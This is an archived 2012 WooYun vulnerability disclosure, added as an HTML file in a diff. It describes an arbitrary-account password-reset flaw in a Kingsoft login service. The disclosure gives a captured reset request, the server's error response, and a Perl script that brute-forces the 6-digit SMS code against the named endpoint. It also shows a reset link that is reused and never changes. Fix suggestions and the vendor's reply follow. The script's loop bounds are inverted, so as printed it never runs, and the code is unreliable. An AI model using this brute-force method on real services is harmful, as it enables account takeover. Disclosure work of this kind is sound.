@@ -1,0 +1,273 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		金山某应用任意帐户密码重置漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		金山某应用任意帐户密码重置漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/风萧萧">风萧萧</a> 
+</li><li>提交时间：		2012-09-25 10:04</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-09-25：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-09-25：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-10-05：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-10-15：	细节向普通白帽子公开<br/>
+									2012-10-25：	细节向实习白帽子公开<br/>
+									2012-11-09：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">金山某应用的用户注册、密码取回的逻辑很奇葩！我一不小心就高潮了</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1.存在漏洞的是下面这个站点，看起来很牛逼的样子哈</p><pre><code>https://login.ijinshan.com/login.html</code></pre><p class='detail'>还是密码取回这里，很脆弱啊！啊啊啊啊！！！</p><p class="detail"><a href="../images/242332570a941a181099780532d4a271bc62ce45.jpg" target="_blank"><img src="../images/242332570a941a181099780532d4a271bc62ce45.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+2.点击忘记密码，填写好手机号码以及验证码后点击下一步，此时服务器已经将6位纯数字的验证码发送到手机短信</p><p class="detail"><a href="../images/24233343264f9a0006e004a411d8bda52a593257.jpg" target="_blank"><img src="../images/24233343264f9a0006e004a411d8bda52a593257.jpg" alt="" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/24233500784d92e578b318c8a87a74e0e4492dce.jpg" target="_blank"><img src="../images/24233500784d92e578b318c8a87a74e0e4492dce.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+3.我们尝试下错误的验证码123456看下：</p><p class="detail"><a href="../images/2423353993db023492f539f4c38322c14b2885a0.jpg" target="_blank"><img src="../images/2423353993db023492f539f4c38322c14b2885a0.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+这个时候抓下包，看看POST的数据是怎么样的：</p><pre><code>POST /forget/verify/mobile HTTP/1.1<br />
+Host: i.ijinshan.com<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 16<br />
+Origin: http://i.ijinshan.com<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/17.0.938.0 Safari/535.8<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Accept: */*<br />
+Referer: http://i.ijinshan.com/forget/send_way<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
+Cookie: PHPSESSID=我的cookie（这里略了，无需登录）; <br />
+<br />
+resetcode=123456</code></pre><p class='detail'></p><p class="detail"><a href="../images/24233759aae38fd233d268192ab19c3cdb19421f.jpg" target="_blank"><img src="../images/24233759aae38fd233d268192ab19c3cdb19421f.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+4.这个cookie是非常重要的，已经对应了重置密码的帐号，所以在构造数据包时不要忘记添加cookie，另外查看错误发送错误的验证码时，返回的信息如下：</p><pre><code>HTTP/1.1 200 OK<br />
+Server: nginx/1.2.1<br />
+Date: Mon, 24 Sep 2012 15:00:14 GMT<br />
+Content-Type: text/html<br />
+Connection: keep-alive<br />
+Vary: Accept-Encoding<br />
+X-Powered-By: PHP/5.3.14<br />
+Content-Length: 57<br />
+<br />
+{&quot;retnum&quot;:-400,&quot;errmsg&quot;:&quot;\u9a8c\u8bc1\u7801\u9519\u8bef&quot;}</code></pre><p class='detail'><br />
+<br />
+也就是说返回的关键字包含&quot;-400&quot;或者&quot;验证码错误&quot;的字样，即表示验证失败，反之就获得成功的验证码。<br />
+<br />
+我写了一个简单的破（perl）代码，目前还是单线程，也贴在这里了</p><pre><code>#!C:/Perl/bin/perl.exe<br />
+<br />
+use strict;<br />
+use LWP::Simple;<br />
+use HTML::TreeBuilder;<br />
+use Tie::File;<br />
+require HTTP::Cookies;<br />
+<br />
+sub usage {<br />
+    print &quot;Kingsoft Password Reset Bug! Find by kunting520!\n&quot;;<br />
+    print &quot;example: perl getpwd.pl cookie isproxy\n&quot;;<br />
+    exit;<br />
+}<br />
+<br />
+if ($#ARGV &lt; 1) { usage; }<br />
+my $cookie = $ARGV[0];<br />
+my $isproxy = $ARGV[1];<br />
+<br />
+my @results;<br />
+my $result_count = 0;<br />
+<br />
+#tie @results, &#039;Tie::File&#039;, $filename ;<br />
+<br />
+my @htmls;<br />
+my $ua = new LWP::UserAgent;<br />
+<br />
+if( $isproxy eq &#039;true&#039;){<br />
+    $ua-&gt;proxy(&#039;http&#039;, &#039;http://127.0.0.1:8080&#039;);<br />
+}<br />
+<br />
+my @header=(<br />
+&#039;Host&#039; =&gt; &#039;i.ijinshan.com&#039;,<br />
+&#039;User-Agent&#039;=&gt;&#039;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1&#039;,<br />
+&#039;Accept&#039; =&gt; &#039;*/*&#039;,<br />
+&#039;X-Requested-With&#039; =&gt; &#039;XMLHttpRequest&#039;,<br />
+&#039;Referer&#039; =&gt; &#039;http://i.ijinshan.com/forget/send_way&#039;,<br />
+&#039;Accept-Charset&#039; =&gt; &#039;gzip, deflate&#039;,<br />
+&#039;Accept-Language&#039; =&gt; &#039;zh-CN,zh;q=0.8&#039;,<br />
+&#039;Accept-Encoding&#039; =&gt; &#039;gzip,deflate,sdch&#039;,<br />
+&#039;Proxy-Connection&#039; =&gt; &#039;keep-alive\r\n&#039;,<br />
+&#039;Cookie&#039;=&gt; $cookie<br />
+);<br />
+<br />
+$ua-&gt;default_header(@header);<br />
+my $code=0;<br />
+my $url = &#039;http://i.ijinshan.com/forget/verify/mobile&#039;;<br />
+<br />
+for($code=1000000;$code&lt;999999;$code++)<br />
+{<br />
+    my $response = $ua-&gt;post( $url ,{&#039;resetcode&#039;=&gt;$code} );<br />
+    my $con = $response-&gt;content;<br />
+    if($con =~ /-400/) {next;}<br />
+    else {print $response-&gt;as_string;last;}<br />
+    #sleep(1);<br />
+}</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">5.嗯，跑下代码吧！发送的数据包 包含有正确的验证码时，返回的errmsg是重置密码的关键了，看图</p><p class="detail"><a href="../images/2423474474897581a42346beedc1e45578a68974.jpg" target="_blank"><img src="../images/2423474474897581a42346beedc1e45578a68974.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+6.将errmsg的值拷贝下来，使用下面的这个链接即可成功取回密码,也就是可以重置新的密码了</p><pre><code>http://i.ijinshan.com/forget/modify?authcode=&quot;errmsg&#039;s value&quot;</code></pre><p class='detail'></p><p class="detail"><a href="../images/242350381cf32e19b25d8779fb8697d75bb7fa50.jpg" target="_blank"><img src="../images/242350381cf32e19b25d8779fb8697d75bb7fa50.jpg" alt="" width="600"/></a></p><p class="detail">呵呵，恭喜欧文密码重置成功了</p><p class="detail"><a href="../images/24235124ab62478cba97fe2a38752f249fb3162c.jpg" target="_blank"><img src="../images/24235124ab62478cba97fe2a38752f249fb3162c.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+7.在用户注册时，也是同样存在这个问题的，可以被暴力验证，也截个图啦：</p><p class="detail"><a href="../images/242352294dffc5c495a644ba18ce7537caaee96f.jpg" target="_blank"><img src="../images/242352294dffc5c495a644ba18ce7537caaee96f.jpg" alt="" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/242352427ea84d34f5ed39275508e0c07c0ca898.jpg" target="_blank"><img src="../images/242352427ea84d34f5ed39275508e0c07c0ca898.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+8.最奇葩的逻辑在这里，重中之重！！！每次取回密码的链接都是一样的！！！都是一样的，一个字母都不差！！！只要记住下面这个链接，即使不用点击取回密码、不用发送短信，一样可以重置密码！！！神了！！！！<br />
+<br />
+</p><pre><code>http://i.ijinshan.com/forget/modify?authcode=&quot;errmsg&#039;s value&quot;</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1.注册帐号时，链接的m参数可以更复杂些，而不是6位纯数字；<br />
+<br />
+2.密码取回时，设置强有力的短信验证码，以免被暴力破解；<br />
+<br />
+3.密码取回连续多次失败时，设置此次密码取回无效，需重新发送验证码；<br />
+<br />
+4.最奇葩的那个&quot;一次取回、永久使用&quot;的链接问题，我不懂了，程序员当时是怎么想的？<br />
+<br />
+<br />
+<br />
+5.最重要的是，20rank和礼物！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/风萧萧" title="风萧萧">风萧萧</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-012685" title="金山某应用任意帐户密码重置漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2012-09-25 10:35</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">收到，<br />
+手机验证码安全这块与用户体验这块是个难平衡的点；然后后面的手机验证码是有时效性的，并不是一直都不变；同时我们也有考虑不周的地方比如请求限制频率和来源等；</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-01-23：已修复</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="12685";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
